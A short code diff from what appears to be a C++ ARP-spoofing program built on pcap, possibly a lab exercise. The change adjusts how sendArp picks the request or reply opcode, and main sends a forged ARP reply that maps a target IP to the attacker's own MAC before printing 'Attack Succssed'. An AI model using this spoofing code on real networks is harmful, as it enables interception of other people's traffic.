@@ -73,7 +73,7 @@ void sendArp(pcap_t* handle, Mac eth_dmac, Mac eth_smac, Mac arp_smac, Ip arp_si
 	packet.arp_.pro_ = htons(EthHdr::Ip4);
 	packet.arp_.hln_ = Mac::SIZE;
 	packet.arp_.pln_ = Ip::SIZE;
-	if (mode)
+	if (mode == 1)
 		packet.arp_.op_ = htons(ArpHdr::Request);
 	else
 		packet.arp_.op_ = htons(ArpHdr::Reply);
@@ -155,7 +155,7 @@ int main(int argc, char* argv[]) {
 		cout << "sender Mac : " << string(senderMac) << endl;
 
 		//send Arp Packet
-		sendArp(handle, senderMac, myMac, myMac, targetIp, senderMac, senderIp, 0); 
+		sendArp(handle, senderMac, myMac, myMac, targetIp, senderMac, senderIp, 2); 
 		cout<< "Attack Succssed" << endl;
 	}	
 	pcap_close(handle);
